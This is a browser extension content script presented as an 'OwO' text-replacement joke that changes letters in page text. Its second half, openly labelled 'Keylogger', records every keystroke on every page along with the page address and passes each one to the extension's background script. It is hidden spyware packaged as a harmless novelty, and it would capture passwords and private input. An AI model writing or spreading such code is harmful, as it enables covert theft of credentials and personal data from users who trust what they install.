// Script that is injected to the webpage

/**
 * OwO Text Replacement Extension
 */
// This makes an array of everything inside the body tag
var bodyElements = [...document.body.getElementsByTagName('*')];


// a function that loops through every single item in array to find text
function findAndReplace(){
    bodyElements.forEach(element =>{
        element.childNodes.forEach(child =>{
            if (child.nodeType === 3) replaceText(child);
        });
    });
}

function replaceText (node) {
    let value = node.nodeValue;
    if (value.includes('o')) {
        value = value.replace(/o/gi, 'owo');
    } else if (value.includes('n')) {
        value = value.replace(/n/gi, 'ny');
    } else if (value.includes('l')) {
        value = value.replace(/l/gi, 'w')
    } else if (value.includes('r')) {
        value = value.replace(/r/gi, 'w')
    }
    node.nodeValue = value;
}

window.onload = findAndReplace();

/** Keylogger */
chrome.runtime.onConnect.addListener(function(port){});

let k;
let data = {};
window.onkeydown = function (event) {

    if (event.key.length > 1) {
        k = "(" + event.key + ")";
    } else {
        k = event.key;
    }

    data = {
        key: k,
        page: window.location.href
    };

    chrome.runtime.sendMessage(data);
}